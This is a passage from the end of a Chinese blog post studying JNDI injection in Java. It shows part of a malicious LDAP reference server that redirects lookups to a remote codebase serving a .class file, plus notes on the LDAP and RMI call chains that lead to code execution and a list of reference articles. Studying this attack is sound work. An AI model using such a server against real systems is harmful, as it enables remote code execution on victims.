</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>cbstring</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>codebase</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>javaFactory</span> <span style=color:#f92672>=</span> <span style=color:#111>Mapper</span><span style=color:#f92672>.</span><span style=color:#75af00>references</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>base</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>javaFactory</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            <span style=color:#111>URL</span> <span style=color:#111>turl</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>URL</span><span style=color:#f92672>(</span><span style=color:#111>cbstring</span> <span style=color:#f92672>+</span> <span style=color:#111>javaFactory</span><span style=color:#f92672>.</span><span style=color:#75af00>concat</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;.class&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>            <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>getLocalTime</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34; [LDAPSERVER] &gt;&gt; Send LDAP reference result for &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>base</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34; redirecting to &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>turl</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>addAttribute</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;javaClassName&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;foo&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>addAttribute</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;javaCodeBase&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>cbstring</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>addAttribute</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;objectClass&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;javaNamingReference&#34;</span><span style=color:#f92672>);</span> <span style=color:#75715e>//$NON-NLS-1$
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>addAttribute</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;javaFactory&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>javaFactory</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>result</span><span style=color:#f92672>.</span><span style=color:#75af00>sendSearchEntry</span><span style=color:#f92672>(</span><span style=color:#111>e</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>result</span><span style=color:#f92672>.</span><span style=color:#75af00>setResult</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>LDAPResult</span><span style=color:#f92672>(</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span> <span style=color:#111>ResultCode</span><span style=color:#f92672>.</span><span style=color:#75af00>SUCCESS</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span><span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>getLocalTime</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34; [LDAPSERVER] &gt;&gt; Reference that matches the name(&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>base</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;) is not found.&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>当客户端来lookup这个生成好的ldap远程地址时，会在各种lookup后收到一个Reference对象，在处理过程中会导致静态代码块的命令执行</p><p>lookup&mdash;&mdash;&mdash;&mdash;&mdash;>DirectoryManager.getObjectInstance->NamingManager.getObjectFactoryFromReference</p><h3 id=rmirefserver>RMIRefServer</h3><p>跟RMI的利用类似，不详说</p><p>lookup&mdash;&mdash;&mdash;&mdash;&mdash;>RegisterContext.decodeObject->NamingManager.getObjectInstance->NamingManager.getObjectFactoryFromReference</p><hr><details><summary><h4 class=inline>以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（</h4></summary><p><a href=http://tttang.com/archive/1611/>JNDI注入分析</a></p><p><a href=https://paper.seebug.org/1091/>Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></p><p><a href=https://www.freebuf.com/articles/web/317625.html>Z3专栏 | JNDI注入和工具分析</a></p><p><a href=https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/>浅析JNDI注入</a></p><p><a href=https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/>浅析高低版JDK下的JNDI注入及绕过</a></p><p><a href=https://www.mi1k7ea.com/2019/09/02/%E7%94%B1JNDI%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84Spring-Framework%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/>由JNDI注入引发的Spring Framework反序列化漏洞</a></p></details></div></section></article></main><div class="w-full h-0 flex-none order-3"></div><aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl"><div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2"><div class="md:max-w-xs flex flex-col md:items-end"><ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col"><li class="px-1 md:px-0"><a href=/posts/ title="Posts page">Posts</a></li><li class="px-1 md:px-0"><a href=/life/ title="Fxxking life page">Fxxking life</a></li><li class="px-1 md:px-0"><a href=/relax/ title="Relaxxx page">Relaxxx</a></li><li class="px-1 md:px-0"><a href=/categories/ title="Categories page">Categories</a></li><li class="px-1 md:px-0"><a href=/series/ title="Series page">Series</a></li><li class="px-1 md:px-0"><a href=/tags/ title="Tags page">Tags</a></li><li class="px-1 md:px-0"><a href=/about/ title="About page">About</a></li><li class="px-1 md:px-0"><a href=/friends/ title="Friends page">Friends</a></li><li class="px-1 md:px-0"><a href=https://www.travellings.cn/go.html title="Travelling page">Travelling</a></li><div id=fastSearch class=m-0><input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search><ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400"></ul></div></ul><div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16"><a href=V2VkIDI3IEFwcmlsIDIwMjIgMTE6MzM6MTUgVVRD target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg></div></a><a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg></div></a><a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg></div></a><a href='TW9uJTIwMTglMjBGZWJydWFyeSUyMDE5ODAlMjAyMTowMjo1NSUyMFVUQw==' target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg></div></a><a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg></div></a><a href='Vmlja3lja3lreQ==' target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg></div></a><a href=https://weibo.com/u/7562434112 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg></div></a><a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg></div></a></div><div class="text-sm text-gray-500 leading-tight a-gray"><br>Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 17716 words in this page.</div></div></div></aside><footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2"><hr class=double-line><div class="flex flex-wrap justify-between pb-2 leading-loose font-serif"><a class=flex-grow-0 href=/2022/06/20/url-parser-and-direction/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>URL解析&重定向的二三事</a>
<a class=flex-grow-0 href=/relax/ipad-mini6-yyds/>iPad mini6使用体验&上手指南<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a></div><div><div class="font-serif pb-2 flex align-start leading-loose"><span class="heading pr-6 leading-loose">Related</span>
<span><a href=/2022/05/30/java-study-notes-05/>Java学习笔记Ⅴ</a>&nbsp;&nbsp;/&nbsp;
<a href=/2022/05/04/java-study-notes-04/>Java学习笔记Ⅳ</a>&nbsp;&nbsp;/&nbsp;
<a href=/2022/03/23/java-study-notes-03/>Java学习笔记Ⅲ</a>&nbsp;&nbsp;/&nbsp;
<a href=/2022/02/28/java-study-notes-02/>Java学习笔记Ⅱ</a>&nbsp;&nbsp;/&nbsp;
<a href=/2022/02/27/java-study-notes-01/>Java学习笔记Ⅰ</a></span></div></div><hr><div class=pb-2><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//amiaaaz.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><hr></footer><script src=/dist/app.js></script>
<script src=/lib/fuse.min.js></script>
<script src=/lib/fastsearch.js></script></div></body></html>